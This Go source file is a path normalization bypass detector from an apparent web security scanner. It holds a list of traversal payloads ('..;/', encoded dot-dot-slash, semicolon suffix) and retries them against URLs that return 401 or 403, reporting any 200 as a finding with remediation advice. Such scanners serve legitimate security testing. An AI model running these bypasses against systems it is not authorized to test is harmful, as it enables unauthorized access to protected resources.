package pathnorm

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/swiss-knife-for-web-security/skws/internal/core"
	"github.com/swiss-knife-for-web-security/skws/internal/http"
)

// bypassPayload represents a path normalization bypass technique.
type bypassPayload struct {
	// Template is a format string where %s is replaced with the path segment.
	Template    string
	Description string
}

// payloads contains the path normalization bypass techniques.
var payloads = []bypassPayload{
	{Template: "..;/%s", Description: "Semicolon path traversal (Spring/Tomcat bypass)"},
	{Template: "....///%s", Description: "Double dot path traversal"},
	{Template: "%%2e%%2e%%2f%s", Description: "URL-encoded dot-dot-slash"},
	{Template: "..%%252f%s", Description: "Double URL-encoded dot-dot-slash"},
	{Template: "%s/./", Description: "Dot segment append"},
	{Template: "/%s..;/", Description: "Semicolon suffix bypass"},
}

// Detector performs Path Normalization Bypass vulnerability detection.
type Detector struct {
	client  *http.Client
	verbose bool
}

// New creates a new Path Normalization Bypass Detector.
func New(client *http.Client) *Detector {
	return &Detector{
		client: client,
	}
}

// WithVerbose enables verbose output.
func (d *Detector) WithVerbose(verbose bool) *Detector {
	d.verbose = verbose
	return d
}

// Name returns the detector name.
func (d *Detector) Name() string {
	return "pathnorm"
}

// DetectOptions configures detection behavior.
type DetectOptions struct {
	MaxPayloads int
	Timeout     time.Duration
}

// DefaultOptions returns default detection options.
func DefaultOptions() DetectOptions {
	return DetectOptions{
		MaxPayloads: 20,
		Timeout:     10 * time.Second,
	}
}

// DetectionResult contains path normalization bypass detection results.
type DetectionResult struct {
	Vulnerable     bool
	Findings       []*core.Finding
	TestedPayloads int
}

// Detect tests a target URL for path normalization bypass vulnerabilities.
// The param argument is the path segment to test bypass techniques against.
// The method argument specifies the HTTP method to use.
func (d *Detector) Detect(ctx context.Context, target, param, method string, opts DetectOptions) (*DetectionResult, error) {
	result := &DetectionResult{
		Findings: make([]*core.Finding, 0),
	}

	// Parse the target URL to extract the path
	parsed, err := url.Parse(target)
	if err != nil {
		return result, fmt.Errorf("failed to parse target URL: %w", err)
	}

	// Get the original response to check for 403/401
	originalResp, err := d.client.Do(ctx, &http.Request{
		Method: method,
		URL:    target,
	})
	if err != nil {
		return result, fmt.Errorf("failed to get original response: %w", err)
	}

	// Only test bypass if the original response is 403 or 401
	if originalResp.StatusCode != 403 && originalResp.StatusCode != 401 {
		return result, nil
	}

	// Determine the path segment to test
	pathSegment := param
	if pathSegment == "" {
		pathSegment = strings.TrimPrefix(parsed.Path, "/")
	}

	// Build base URL (scheme + host)
	baseURL := parsed.Scheme + "://" + parsed.Host

	// Test each bypass payload
	testPayloads := payloads
	if opts.MaxPayloads > 0 && len(testPayloads) > opts.MaxPayloads {
		testPayloads = testPayloads[:opts.MaxPayloads]
	}

	for _, payload := range testPayloads {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		result.TestedPayloads++

		// Build the bypass URL
		bypassPath := fmt.Sprintf(payload.Template, pathSegment)
		bypassURL := baseURL + "/" + bypassPath

		resp, err := d.client.Do(ctx, &http.Request{
			Method: method,
			URL:    bypassURL,
		})
		if err != nil {
			continue
		}

		// If original was 403/401 and bypass returns 200, it's a vulnerability
		if resp.StatusCode == 200 {
			finding := d.createFinding(target, bypassURL, payload, originalResp, resp)
			result.Findings = append(result.Findings, finding)
			result.Vulnerable = true
		}
	}

	return result, nil
}

// createFinding creates a Finding from a successful path normalization bypass.
func (d *Detector) createFinding(originalURL, bypassURL string, payload bypassPayload, originalResp, bypassResp *http.Response) *core.Finding {
	finding := core.NewFinding("Path Normalization Bypass", core.SeverityHigh)
	finding.URL = originalURL
	finding.Description = fmt.Sprintf("Path normalization bypass detected: %s (original: %d, bypass: %d)",
		payload.Description, originalResp.StatusCode, bypassResp.StatusCode)
	finding.Evidence = fmt.Sprintf("Original URL: %s (Status: %d)\nBypass URL: %s (Status: %d)\nTechnique: %s\nBypass body length: %d",
		originalURL, originalResp.StatusCode, bypassURL, bypassResp.StatusCode, payload.Description, len(bypassResp.Body))
	finding.Tool = "pathnorm-detector"
	finding.Remediation = "Normalize paths before applying access control checks. " +
		"Use a web application firewall (WAF) to detect path traversal attempts. " +
		"Ensure the application server properly resolves path segments before authorization."

	finding.WithOWASPMapping(
		[]string{"WSTG-ATHZ-02"},
		[]string{"A01:2021"},
		[]string{"CWE-22"},
	)

	return finding
}
